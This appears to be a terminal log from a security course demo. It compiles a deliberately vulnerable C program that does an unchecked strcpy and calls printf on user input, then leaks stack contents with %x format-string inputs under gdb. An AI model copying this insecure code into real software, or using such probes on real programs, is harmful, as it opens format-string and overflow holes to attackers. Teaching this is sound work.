@@ -1,0 +1,216 @@
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final$ cd "Demo 4_15"
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ ls
+add.c  fmt.c
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ cat fmt.c
+#include<stdio.h>
+
+int main(int argc, char** argv) 
+{
+	char buffer[256];
+	strcpy(buffer, argv[1]);
+	printf(buffer);
+	return 0;
+}
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ cat add.c
+
+int main()
+{
+	int a = 10;
+	printf("%d", a);
+}
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ gcc fmt.c -o fmt -fno-stack-protector -g
+fmt.c: In function ‘main’:
+fmt.c:6:2: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+  strcpy(buffer, argv[1]);
+  ^
+fmt.c:6:2: warning: incompatible implicit declaration of built-in function ‘strcpy’
+fmt.c:6:2: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
+fmt.c:7:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(buffer);
+         ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ ./fmt AAAA
+AAAAuser@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ ./fmt AAAA-%X
+AAAA-BFB9D2CBuser@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ ./fmt AAAA-%x
+AAAA-bfa852cbuser@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ ./x-%x-%x-%x
+AAAA-bfec62bf-f63d4e2e-b7524f12-41414141-2d78252duser@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ 
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ 
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ gdb fmt -q
+Reading symbols from fmt...done.
+(gdb) info functions
+All defined functions:
+
+File fmt.c:
+int main(int, char **);
+
+Non-debugging symbols:
+0x080482cc  _init
+0x08048300  printf@plt
+0x08048310  strcpy@plt
+0x08048320  __libc_start_main@plt
+0x08048340  _start
+0x08048370  __x86.get_pc_thunk.bx
+0x08048380  deregister_tm_clones
+0x080483b0  register_tm_clones
+0x080483f0  __do_global_dtors_aux
+0x08048410  frame_dummy
+0x08048490  __libc_csu_init
+0x080484f0  __libc_csu_fini
+0x080484f4  _fini
+(gdb) list 1
+1	#include<stdio.h>
+2	
+3	int main(int argc, char** argv) 
+4	{
+5		char buffer[256];
+6		strcpy(buffer, argv[1]);
+7		printf(buffer);
+8		return 0;
+9	}
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0804843b <+0>:	lea    0x4(%esp),%ecx
+   0x0804843f <+4>:	and    $0xfffffff0,%esp
+   0x08048442 <+7>:	pushl  -0x4(%ecx)
+   0x08048445 <+10>:	push   %ebp
+   0x08048446 <+11>:	mov    %esp,%ebp
+   0x08048448 <+13>:	push   %ecx
+   0x08048449 <+14>:	sub    $0x104,%esp
+   0x0804844f <+20>:	mov    %ecx,%eax
+   0x08048451 <+22>:	mov    0x4(%eax),%eax
+   0x08048454 <+25>:	add    $0x4,%eax
+   0x08048457 <+28>:	mov    (%eax),%eax
+   0x08048459 <+30>:	sub    $0x8,%esp
+   0x0804845c <+33>:	push   %eax
+   0x0804845d <+34>:	lea    -0x108(%ebp),%eax
+   0x08048463 <+40>:	push   %eax
+   0x08048464 <+41>:	call   0x8048310 <strcpy@plt>
+   0x08048469 <+46>:	add    $0x10,%esp
+   0x0804846c <+49>:	sub    $0xc,%esp
+   0x0804846f <+52>:	lea    -0x108(%ebp),%eax
+   0x08048475 <+58>:	push   %eax
+   0x08048476 <+59>:	call   0x8048300 <printf@plt>
+   0x0804847b <+64>:	add    $0x10,%esp
+   0x0804847e <+67>:	mov    $0x0,%eax
+   0x08048483 <+72>:	mov    -0x4(%ebp),%ecx
+   0x08048486 <+75>:	leave  
+   0x08048487 <+76>:	lea    -0x4(%ecx),%esp
+   0x0804848a <+79>:	ret    
+End of assembler dump.
+(gdb) print /d 0x104
+$1 = 260
+(gdb) b *0x08048464
+Breakpoint 1 at 0x8048464: file fmt.c, line 6.
+(gdb) b *0x08048469
+Breakpoint 2 at 0x8048469: file fmt.c, line 6.
+(gdb) break *0x08048476
+Breakpoint 3 at 0x8048476: file fmt.c, line 7.
+(gdb) break *0x0804847b
+Breakpoint 4 at 0x804847b: file fmt.c, line 7.
+(gdb) run $(python -c 'print("A"*50)')
+Starting program: /home/user/Documents/ENPM-691/Demos/Final/Demo 4_15/fmt $(python -c 'print("A"*50)')
+
+Breakpoint 1, 0x08048464 in main (argc=2, argv=0xbffff074) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) x/20xw $esp
+0xbfffeeb0:	0xbfffeec0	0xbffff284	0xf63d4e2e	0xb7e0ef12
+0xbfffeec0:	0x000008ea	0xb7e18618	0xb7e17dc8	0x07b1ea71
+0xbfffeed0:	0xb7ff7968	0xbfffef80	0xb7ff581f	0xb7fd7b18
+0xbfffeee0:	0x00000000	0x00000000	0xb7fff000	0xb7fffc08
+0xbfffeef0:	0x00000000	0x00000000	0x00000000	0xbfffef8c
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048469 in main (argc=2, argv=0xbffff074) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) x/20xw $esp
+0xbfffeeb0:	0xbfffeec0	0xbffff284	0xf63d4e2e	0xb7e0ef12
+0xbfffeec0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeed0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeee0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeef0:	0x00004141	0x00000000	0x00000000	0xbfffef8c
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048476 in main (argc=2, argv=0xbffff074) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x0804847b in main (argc=2, argv=0xbffff074) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[Inferior 1 (process 8432) exited normally]
+(gdb) run ENPM-%x-%x-%x-%x-%x-%x-%x
+Starting program: /home/user/Documents/ENPM-691/Demos/Final/Demo 4_15/fmt ENPM-%x-%x-%x-%x-%x-%x-%x
+
+Breakpoint 1, 0x08048464 in main (argc=2, argv=0xbffff094) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) x/20xw $esp
+0xbfffeed0:	0xbfffeee0	0xbffff29d	0xf63d4e2e	0xb7e0ef12
+0xbfffeee0:	0x000008ea	0xb7e18618	0xb7e17dc8	0x07b1ea71
+0xbfffeef0:	0xb7ff7968	0xbfffefa0	0xb7ff581f	0xb7fd7b18
+0xbfffef00:	0x00000000	0x00000000	0xb7fff000	0xb7fffc08
+0xbfffef10:	0x00000000	0x00000000	0x00000000	0xbfffefac
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048469 in main (argc=2, argv=0xbffff094) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) x/20xw $esp
+0xbfffeed0:	0xbfffeee0	0xbffff29d	0xf63d4e2e	0xb7e0ef12
+0xbfffeee0:	0x4d504e45	0x2d78252d	0x252d7825	0x78252d78
+0xbfffeef0:	0x2d78252d	0x252d7825	0xb7ff0078	0xb7fd7b18
+0xbfffef00:	0x00000000	0x00000000	0xb7fff000	0xb7fffc08
+0xbfffef10:	0x00000000	0x00000000	0x00000000	0xbfffefac
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048476 in main (argc=2, argv=0xbffff094) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x0804847b in main (argc=2, argv=0xbffff094) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+ENPM-bffff29d-f63d4e2e-b7e0ef12-4d504e45-2d78252d-252d7825-78252d78[Inferior 1 (process 8441) exited normally]
+(gdb) kill
+The program is not being run.
+(gdb) run $(python -c 'print("A"*50 + "-%x"*10)')
+Starting program: /home/user/Documents/ENPM-691/Demos/Final/Demo 4_15/fmt $(python -c 'print("A"*50 + "-%x"*10)')
+
+Breakpoint 1, 0x08048464 in main (argc=2, argv=0xbffff054) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048469 in main (argc=2, argv=0xbffff054) at fmt.c:6
+6		strcpy(buffer, argv[1]);
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048476 in main (argc=2, argv=0xbffff054) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x0804847b in main (argc=2, argv=0xbffff054) at fmt.c:7
+7		printf(buffer);
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-bffff266-f63d4e2e-b7e0ef12-41414141-41414141-41414141-41414141-41414141-41414141-41414141[Inferior 1 (process 8466) exited normally]
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ gcc fmt.c -o fmt -fno-stack-protector -g
+fmt.c: In function ‘main’:
+fmt.c:6:2: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+  strcpy(buffer, argv[1]);
+  ^
+fmt.c:6:2: warning: incompatible implicit declaration of built-in function ‘strcpy’
+fmt.c:6:2: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
+fmt.c:7:9: warning: format not a string literal and no format arguments [-Wformat-security]
+  printf(buffer);
+         ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Final/Demo 4_15$ 
+
